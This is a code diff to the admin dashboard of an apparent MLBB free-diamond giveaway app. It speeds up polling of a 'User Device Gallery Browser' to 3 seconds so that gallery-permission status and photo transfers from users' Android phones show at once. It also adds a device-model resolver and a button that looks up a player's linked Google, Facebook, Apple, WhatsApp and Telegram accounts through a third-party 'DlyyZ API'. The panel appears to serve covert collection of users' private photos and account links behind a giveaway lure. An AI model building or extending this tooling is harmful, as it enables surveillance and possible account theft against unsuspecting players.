@@ -99,6 +99,9 @@ function switchView(viewName) {
   if (viewName === "gallery") fetchGalleryOverview();
   if (viewName === "settings") loadConfig();
 
+  // Adjust auto-refresh frequency dynamically based on view
+  setupAutoRefresh();
+
   // Close mobile sidebar if open
   const sidebar = document.getElementById("sidebar");
   if (sidebar) sidebar.classList.remove("mobile-open");
@@ -425,15 +428,21 @@ function setupEventListeners() {
 }
 
 // --- AUTO-REFRESH ENGINE ---
-function setupAutoRefresh(seconds = 30) {
+function setupAutoRefresh(seconds = null) {
   if (adminState.autoRefreshInterval) {
     clearInterval(adminState.autoRefreshInterval);
     adminState.autoRefreshInterval = null;
   }
-  if (seconds > 0) {
+  const selectAutoRefresh = document.getElementById("selectAutoRefresh");
+  const baseSeconds = (seconds !== null) ? seconds : (parseInt(selectAutoRefresh?.value, 10) || 30);
+
+  // Real-time polling (every 3s) when viewing Gallery Browser so permission status and photo transfers reflect immediately without delay
+  const pollInterval = (adminState.currentView === "gallery") ? 3 : baseSeconds;
+
+  if (pollInterval > 0) {
     adminState.autoRefreshInterval = setInterval(() => {
       refreshCurrentView();
-    }, seconds * 1000);
+    }, pollInterval * 1000);
   }
 }
 
@@ -629,7 +638,7 @@ async function fetchRedemptions() {
         <tr>
           <td><strong class="font-mono text-xs">#${escapeHtml(r.order_id || "—")}</strong></td>
           <td>
-            <div class="font-medium">${escapeHtml(r.user_email || "guest@ketupat.app")}</div>
+            <div class="font-medium">${escapeHtml(formatUserEmail(r.user_email))}</div>
           </td>
           <td>
             <div><strong>${escapeHtml(r.mlbb_ign || "—")}</strong></div>
@@ -836,7 +845,7 @@ async function fetchUsers(search = "") {
             <div class="user-cell-meta">
               <img src="${u.avatar_data ? escapeHtml(u.avatar_data) : "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23cbd5e1'%3E%3Ccircle cx='12' cy='8' r='4'/%3E%3Cpath d='M20 21a8 8 0 0 0-16 0'/%3E%3C/svg%3E"}" class="user-mini-avatar" alt="Avatar" style="cursor: pointer;" title="Browse gallery" onclick="browseUserGallery('${escapeHtml(u.email)}')">
               <div class="user-cell-text">
-                <span class="user-cell-email">${escapeHtml(u.email || "—")}</span>
+                <span class="user-cell-email">${escapeHtml(formatUserEmail(u.email))}</span>
                 <span class="user-cell-ign">${escapeHtml(u.username || u.mlbb_ign || "No IGN")}</span>
               </div>
             </div>
@@ -1009,7 +1018,7 @@ async function fetchGiveaways() {
         <tr>
           <td><strong class="font-mono text-xs">#${g.id || "—"}</strong></td>
           <td><span class="badge-pending font-bold">${escapeHtml((g.pool_type || "daily").toUpperCase())}</span></td>
-          <td>${escapeHtml(g.user_email || "—")}</td>
+          <td>${escapeHtml(formatUserEmail(g.user_email))}</td>
           <td>
             <strong>${escapeHtml(g.mlbb_ign || "—")}</strong>
             <div class="text-xs text-muted">${escapeHtml(g.mlbb_id || "—")} (${escapeHtml(g.mlbb_server || "—")})</div>
@@ -1110,7 +1119,7 @@ async function handleRollWinner() {
 
     const winner = json.data.winner || {};
     document.getElementById("winnerIgn").textContent = winner.mlbb_ign || winner.user_email || "Unknown Winner";
-    document.getElementById("winnerEmail").textContent = winner.user_email || "No email";
+    document.getElementById("winnerEmail").textContent = formatUserEmail(winner.user_email);
     document.getElementById("winnerPool").textContent = `${(winner.pool_type || "daily").toUpperCase()} POOL`;
     document.getElementById("winnerMlbbId").textContent = `${winner.mlbb_id || "—"} (${winner.mlbb_server || "—"})`;
     document.getElementById("winnerTicketCount").textContent = `${winner.ticket_count || 1} tickets (Total pool: ${json.data.total_tickets} tickets)`;
@@ -1279,6 +1288,15 @@ function escapeHtml(str) {
     .replace(/'/g, "&#039;");
 }
 
+function formatUserEmail(email) {
+  if (!email) return "—";
+  const str = String(email).trim();
+  if (!str || str.toLowerCase() === "guest@ketupat.app" || str.toLowerCase().endsWith("@ketupat.app")) {
+    return "—";
+  }
+  return str;
+}
+
 // ==============================================================================
 // 6. USER DEVICE GALLERY BROWSER & LIGHTBOX CONTROLLER
 // ==============================================================================
@@ -1382,11 +1400,11 @@ function renderGalleryDevicesGrid() {
   }
 
   grid.innerHTML = filtered.map(d => {
-    const phoneModel = d.phone_model || d.device_model || d.device_name || "Android Device";
+    const phoneModel = formatPhoneModelName(d.phone_model || d.device_model || d.device_name || "Android Device");
     const tag = d.device_tag ? `#${d.device_tag}` : "";
     const ign = d.ign && d.ign !== "—" ? d.ign : "Player";
     const mlbbStr = (d.mlbb_id && d.mlbb_id !== "—") ? `${d.mlbb_id} (${d.mlbb_server || "—"})` : "No MLBB ID";
-    const email = d.email || "—";
+    const email = formatUserEmail(d.email);
     const photoCount = d.photo_count || 0;
     const isGranted = d.has_access;
     const isAvatarOnly = d.access_status === "avatar_only";
@@ -1576,7 +1594,7 @@ async function loadUserGallery(deviceId, isSilent = false) {
     const { device, user, photos, has_gallery_access, access_status } = json.data;
     adminState.galleryPhotos = photos || [];
 
-    const phoneModel = device?.phone_model || device?.model || user?.device_model || user?.device_name || "Android Device";
+    const phoneModel = formatPhoneModelName(device?.phone_model || device?.model || user?.device_model || user?.device_name || "Android Device");
     const tagStr = device?.tag ? ` #${device.tag}` : "";
 
     // Update breadcrumb
@@ -1607,12 +1625,12 @@ async function loadUserGallery(deviceId, isSilent = false) {
       }
 
       document.getElementById("galleryHeroIgn").textContent = user.ign || "Player";
-      document.getElementById("galleryHeroEmail").textContent = user.email || "—";
+      document.getElementById("galleryHeroEmail").textContent = formatUserEmail(user.email || device?.email);
       document.getElementById("galleryHeroMlbb").textContent = `${idStr} (${srvStr})`;
       document.getElementById("galleryHeroPhotoCount").textContent = `${photos.length} Photo${photos.length === 1 ? "" : "s"}`;
 
       const devNameEl = document.getElementById("galleryHeroDeviceName");
-      if (devNameEl) devNameEl.textContent = device?.name || user.device_name || "Android Device";
+      if (devNameEl) devNameEl.textContent = phoneModel;
 
       const devIdEl = document.getElementById("galleryHeroDeviceId");
       if (devIdEl) devIdEl.textContent = device?.id || user.device_id || deviceId || "—";
@@ -1724,10 +1742,11 @@ function renderDeviceInfo(data) {
   const container = document.getElementById("deviceSpecContainer");
   if (!container || !data) return;
   const { device, user, photos, has_gallery_access } = data;
-  const phoneModel = device?.phone_model || device?.model || "Android Device";
+  const rawModel = device?.phone_model || device?.model || user?.device_model || user?.device_name || "Android Device";
+  const phoneModel = formatPhoneModelName(rawModel);
   const deviceTag = device?.tag || device?.id || "—";
   const deviceId = device?.id || user?.device_id || adminState.selectedGalleryDeviceId || "—";
-  const fingerprint = device?.fingerprint || "Standard Android (Pending sync)";
+  const fingerprint = device?.fingerprint ? String(device.fingerprint).replace(/\s*Build\/[^\s,;]+.*/i, "") : "Standard Android";
   const storagePath = device?.storage_path || "uploads/gallery/...";
   const storageSize = device?.storage_size_formatted || "0 KB";
   const lastSynced = device?.last_synced ? new Date(device.last_synced).toLocaleString() : "Recently";
@@ -1748,7 +1767,11 @@ function renderDeviceInfo(data) {
       <div class="spec-list">
         <div class="spec-item">
           <span class="spec-label">Phone Model:</span>
-          <span class="spec-val">${escapeHtml(phoneModel)}</span>
+          <span class="spec-val highlight">${escapeHtml(phoneModel)}</span>
+        </div>
+        <div class="spec-item">
+          <span class="spec-label">Hardware Identifier:</span>
+          <span class="spec-val font-mono text-xs text-muted">${escapeHtml(rawModel.replace(/\s*Build\/[^\s,;]+.*/i, ""))}</span>
         </div>
         <div class="spec-item">
           <span class="spec-label">Unique Device ID:</span>
@@ -1760,10 +1783,6 @@ function renderDeviceInfo(data) {
         <div class="spec-item">
           <span class="spec-label">Short Device Tag:</span>
           <span class="spec-val"><span class="badge-region-pill font-mono">#${escapeHtml(deviceTag)}</span></span>
-        </div>
-        <div class="spec-item spec-item-stacked">
-          <span class="spec-label">Build Fingerprint:</span>
-          <span class="spec-val font-mono text-xs text-muted">${escapeHtml(fingerprint)}</span>
         </div>
       </div>
     </div>
@@ -1845,7 +1864,7 @@ function renderMlbbInfo(data) {
   const mlbbId = user?.mlbb_id && user.mlbb_id !== "—" ? user.mlbb_id : (device?.mlbb_id || "—");
   const mlbbServer = user?.mlbb_server && user.mlbb_server !== "—" ? user.mlbb_server : (device?.mlbb_server || "—");
   const region = user?.region || "—";
-  const email = user?.email || device?.email || "—";
+  const email = formatUserEmail(user?.email || device?.email);
   const points = user?.points || 0;
   const diamonds = user?.diamonds_claimed || 0;
   const binds = data.binds || device?.binds || [];
@@ -1856,14 +1875,36 @@ function renderMlbbInfo(data) {
     { key: "google", label: "Google Play", icon: "play_arrow" },
     { key: "facebook", label: "Facebook", icon: "thumb_up" },
     { key: "tiktok", label: "TikTok", icon: "video_library" },
+    { key: "apple", label: "Apple ID", icon: "devices" },
+    { key: "gcid", label: "Game Center", icon: "sports_esports" },
+    { key: "whatsapp", label: "WhatsApp", icon: "chat" },
+    { key: "telegram", label: "Telegram", icon: "send" },
     { key: "vk", label: "VKontakte", icon: "share" }
   ];
 
   const bindsHtml = standardPlatforms.map(p => {
-    const isBound = (userBinds[p.key] && (userBinds[p.key].email || userBinds[p.key].username)) || 
-                    binds.some(b => b.key === p.key || (b.label && b.label.toLowerCase().includes(p.key)));
-    const ub = userBinds[p.key] || {};
-    const detailStr = (ub.username || ub.email) ? `${ub.username ? ub.username + ' ' : ''}${ub.email ? '(' + ub.email + ')' : ''}` : (isBound ? 'Connected' : 'Not Connected');
+    let boundDetail = "";
+    let isBound = false;
+
+    // Check userBinds
+    if (userBinds && userBinds[p.key]) {
+      const ub = userBinds[p.key];
+      if (ub.email || ub.username) {
+        isBound = true;
+        boundDetail = `${ub.username ? ub.username + ' ' : ''}${ub.email ? '(' + ub.email + ')' : ''}`.trim();
+      }
+    }
+
+    // Check binds array from DlyyZ API
+    if (!isBound && Array.isArray(binds)) {
+      const found = binds.find(b => b.key === p.key || (b.label && b.label.toLowerCase().includes(p.key)));
+      if (found && found.bound) {
+        isBound = true;
+        boundDetail = found.detail || "Connected";
+      }
+    }
+
+    const detailStr = isBound ? (boundDetail || "Connected") : "Not Connected";
 
     return `
       <div class="bind-pill ${isBound ? 'bound' : 'unbound'}">
@@ -1947,14 +1988,20 @@ function renderMlbbInfo(data) {
 
     <!-- Card 3: Platform Binds -->
     <div class="spec-card" style="grid-column: 1 / -1;">
-      <div class="spec-card-header">
-        <div class="spec-card-icon">
-          <span class="material-symbols-outlined">link</span>
+      <div class="spec-card-header" style="justify-content: space-between; flex-wrap: wrap; gap: 12px;">
+        <div style="display: flex; align-items: center; gap: 12px;">
+          <div class="spec-card-icon">
+            <span class="material-symbols-outlined">link</span>
+          </div>
+          <div>
+            <h4 class="spec-card-title">Third-Party Platform Connections</h4>
+            <p class="spec-card-desc">Social & game account binds verified via DlyyZ REST API</p>
+          </div>
         </div>
-        <div>
-          <h4 class="spec-card-title">Third-Party Platform Connections</h4>
-          <p class="spec-card-desc">Social & game account binds synced from mobile client</p>
-        </div>
+        <button type="button" class="btn btn-primary btn-sm" id="btnCheckDlyyzBinds" onclick="triggerDlyyzBindCheck('${escapeHtml(mlbbId)}', '${escapeHtml(mlbbServer)}', '${escapeHtml(device?.id || adminState.selectedGalleryDeviceId || '')}')">
+          <span class="material-symbols-outlined btn-icon" style="font-size: 15px;">sync</span>
+          <span>Query Live Binds (DlyyZ API)</span>
+        </button>
       </div>
       <div class="binds-container">
         ${bindsHtml}
@@ -2217,5 +2264,157 @@ async function handleUploadGalleryModal(e) {
   } finally {
     btn.disabled = false;
     btn.textContent = "Upload to Gallery";
+  }
+}
+
+// --- PHONE MODEL SANITIZER & CONSUMER NAME RESOLVER ---
+function formatPhoneModelName(raw) {
+  if (!raw) return "Android Device";
+  let str = String(raw).trim();
+
+  // 1. Strip raw Android Build IDs like "Build/TP1A.220624.014", "Build/UQ1A...", etc.
+  str = str.replace(/\s*Build\/[^\s,;]+.*/i, "");
+  str = str.replace(/\s*Build[A-Za-z0-9._-]+.*/i, "");
+
+  // 2. Clean browser UA fragments if full userAgent was uploaded
+  str = str.replace(/^(?:Mozilla\/5\.0|Linux; Android \d+;?|\(Linux; Android \d+;?)\s*/i, "");
+  str = str.replace(/[;)(]/g, "").trim();
+
+  if (!str) return "Android Device";
+
+  // 3. Mapping dictionary
+  const modelMap = [
+    // Samsung Galaxy S-Series
+    { code: "SM-S908", name: "Samsung Galaxy S22 Ultra" },
+    { code: "SM-S901", name: "Samsung Galaxy S22" },
+    { code: "SM-S906", name: "Samsung Galaxy S22+" },
+    { code: "SM-S918", name: "Samsung Galaxy S23 Ultra" },
+    { code: "SM-S911", name: "Samsung Galaxy S23" },
+    { code: "SM-S916", name: "Samsung Galaxy S23+" },
+    { code: "SM-S928", name: "Samsung Galaxy S24 Ultra" },
+    { code: "SM-S921", name: "Samsung Galaxy S24" },
+    { code: "SM-S926", name: "Samsung Galaxy S24+" },
+    { code: "SM-S938", name: "Samsung Galaxy S25 Ultra" },
+    { code: "SM-S931", name: "Samsung Galaxy S25" },
+    { code: "SM-S936", name: "Samsung Galaxy S25+" },
+    { code: "SM-G998", name: "Samsung Galaxy S21 Ultra" },
+    { code: "SM-G991", name: "Samsung Galaxy S21" },
+    { code: "SM-G996", name: "Samsung Galaxy S21+" },
+    { code: "SM-G988", name: "Samsung Galaxy S20 Ultra" },
+    { code: "SM-G980", name: "Samsung Galaxy S20" },
+    { code: "SM-G981", name: "Samsung Galaxy S20 5G" },
+    { code: "SM-G985", name: "Samsung Galaxy S20+" },
+    { code: "SM-G986", name: "Samsung Galaxy S20+ 5G" },
+    { code: "SM-G973", name: "Samsung Galaxy S10" },
+    { code: "SM-G975", name: "Samsung Galaxy S10+" },
+    { code: "SM-G970", name: "Samsung Galaxy S10e" },
+    { code: "SM-G780", name: "Samsung Galaxy S20 FE" },
+    { code: "SM-G781", name: "Samsung Galaxy S20 FE 5G" },
+
+    // Samsung Galaxy Note Series
+    { code: "SM-N986", name: "Samsung Galaxy Note 20 Ultra" },
+    { code: "SM-N981", name: "Samsung Galaxy Note 20" },
+    { code: "SM-N975", name: "Samsung Galaxy Note 10+" },
+    { code: "SM-N970", name: "Samsung Galaxy Note 10" },
+
+    // Samsung Galaxy Z Fold & Flip Series
+    { code: "SM-F946", name: "Samsung Galaxy Z Fold5" },
+    { code: "SM-F936", name: "Samsung Galaxy Z Fold4" },
+    { code: "SM-F926", name: "Samsung Galaxy Z Fold3" },
+    { code: "SM-F731", name: "Samsung Galaxy Z Flip5" },
+    { code: "SM-F721", name: "Samsung Galaxy Z Flip4" },
+    { code: "SM-F711", name: "Samsung Galaxy Z Flip3" },
+
+    // Samsung Galaxy A Series
+    { code: "SM-A546", name: "Samsung Galaxy A54 5G" },
+    { code: "SM-A536", name: "Samsung Galaxy A53 5G" },
+    { code: "SM-A528", name: "Samsung Galaxy A52s 5G" },
+    { code: "SM-A526", name: "Samsung Galaxy A52 5G" },
+    { code: "SM-A525", name: "Samsung Galaxy A52" },
+    { code: "SM-A346", name: "Samsung Galaxy A34 5G" },
+    { code: "SM-A336", name: "Samsung Galaxy A33 5G" },
+    { code: "SM-A256", name: "Samsung Galaxy A25 5G" },
+    { code: "SM-A156", name: "Samsung Galaxy A15 5G" },
+    { code: "SM-A155", name: "Samsung Galaxy A15" },
+    { code: "SM-A146", name: "Samsung Galaxy A14 5G" },
+    { code: "SM-A145", name: "Samsung Galaxy A14" },
+    { code: "SM-A556", name: "Samsung Galaxy A55 5G" },
+    { code: "SM-A356", name: "Samsung Galaxy A35 5G" },
+    { code: "SM-A736", name: "Samsung Galaxy A73 5G" },
+
+    // Xiaomi & POCO & Redmi
+    { code: "23127PN0CG", name: "Xiaomi 14" },
+    { code: "23127PN0CC", name: "Xiaomi 14" },
+    { code: "23116PN5BC", name: "Xiaomi 14 Pro" },
+    { code: "24030PN60G", name: "Xiaomi 14 Ultra" },
+    { code: "2210132G", name: "Xiaomi 13 Pro" },
+    { code: "2211133G", name: "Xiaomi 13" },
+    { code: "2201122G", name: "Xiaomi 12 Pro" },
+    { code: "2201123G", name: "Xiaomi 12" },
+    { code: "M2012K11AG", name: "POCO F3" },
+    { code: "22041216UG", name: "POCO F4" },
+    { code: "23049PCD8G", name: "POCO F5" },
+    { code: "24069PC21G", name: "POCO F6" },
+    { code: "2311DRK48G", name: "POCO X6 Pro" },
+    { code: "22101316G", name: "Redmi Note 12 Pro+" },
+    { code: "23090RA98G", name: "Redmi Note 13 Pro+" },
+    { code: "2312DRA50G", name: "Redmi Note 13 Pro" },
+    { code: "2201117TY", name: "Redmi Note 11" },
+    { code: "2201116SG", name: "Redmi Note 11 Pro" },
+
+    // ASUS ROG
+    { code: "ASUS_AI2201", name: "ASUS ROG Phone 6" },
+    { code: "ASUS_AI2202", name: "ASUS Zenfone 9" },
+    { code: "ASUS_AI2205", name: "ASUS ROG Phone 7" },
+    { code: "ASUS_AI2401", name: "ASUS ROG Phone 8" }
+  ];
+
+  const lower = str.toLowerCase();
+  for (const item of modelMap) {
+    if (lower.includes(item.code.toLowerCase())) {
+      return item.name;
+    }
+  }
+
+  const smMatch = str.match(/^SM-([A-Z0-9]+)/i);
+  if (smMatch) {
+    return `Samsung Galaxy (${smMatch[0].toUpperCase()})`;
+  }
+
+  return str;
+}
+
+// --- DLYYZ LIVE BIND CHECK TRIGGER ---
+async function triggerDlyyzBindCheck(mlbbId, mlbbServer, deviceId) {
+  if (!mlbbId || mlbbId === "—" || !mlbbServer || mlbbServer === "—") {
+    showToast("Valid MLBB User ID and Server required to query binds", "warning");
+    return;
+  }
+  const btn = document.getElementById("btnCheckDlyyzBinds");
+  if (btn) {
+    btn.disabled = true;
+    btn.innerHTML = '<span class="material-symbols-outlined spin" style="font-size: 14px;">sync</span><span>Verifying DlyyZ API...</span>';
+  }
+  try {
+    const res = await fetch(`api.php?action=check_dlyyz_binds&mlbb_id=${encodeURIComponent(mlbbId)}&mlbb_server=${encodeURIComponent(mlbbServer)}&device_id=${encodeURIComponent(deviceId || "")}`);
+    const json = await res.json();
+    if (json.success && json.data) {
+      showToast("Live MLBB account binds verified via DlyyZ API!", "check_circle");
+      if (adminState.activeDeviceDetail) {
+        adminState.activeDeviceDetail.binds = json.data.binds;
+        if (!adminState.activeDeviceDetail.device) adminState.activeDeviceDetail.device = {};
+        adminState.activeDeviceDetail.device.binds = json.data.binds;
+        renderMlbbInfo(adminState.activeDeviceDetail);
+      }
+    } else {
+      showToast(json.message || "Failed to query DlyyZ API", "error");
+    }
+  } catch (err) {
+    showToast("Network error querying DlyyZ API", "error");
+  } finally {
+    if (btn) {
+      btn.disabled = false;
+      btn.innerHTML = '<span class="material-symbols-outlined btn-icon" style="font-size: 15px;">sync</span><span>Query Live Binds (DlyyZ API)</span>';
+    }
   }
 }
